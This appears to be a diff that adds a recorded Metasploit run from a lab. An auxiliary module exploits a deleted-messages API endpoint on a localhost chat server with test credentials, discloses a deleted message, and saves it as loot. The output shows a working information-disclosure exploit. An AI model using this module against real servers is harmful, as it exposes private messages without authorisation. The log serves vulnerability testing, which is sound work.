@@ -1,0 +1,20 @@
+Loaded 1 modules:
+    1 auxiliary modules
+RHOSTS => 127.0.0.1
+RPORT => 39649
+TARGETURI => /api/v1/chat.getDeletedMessages
+SSL => false
+VERBOSE => true
+USERNAME => alice
+PASSWORD => Al1ce-Lab-Pass!
+ROOMID => 6b047a6de7422a44df31cadf
+SINCE => 2000-01-01T00:00:00.000Z
+COUNT => 100
+[*] Running module against 127.0.0.1
+[*] 127.0.0.1:39649 - Signed in as alice (user id rSQxouLt89hux5j4J)
+[+] 127.0.0.1:39649 - VULN-010: exploited
+[+] 127.0.0.1:39649 - 1 deleted message(s) disclosed for room 6b047a6de7422a44df31cadf
+[*]   id=k8ZtAsjFbSWoy7o39 ts=
+[+] 127.0.0.1:39649 - Saved the response to /tmp/.msf4/loot/20261124200554_default_127.0.0.1_blue_spider.vuln_653609.txt
+[*] Auxiliary module execution completed
+whoami: cannot find name for user ID 997
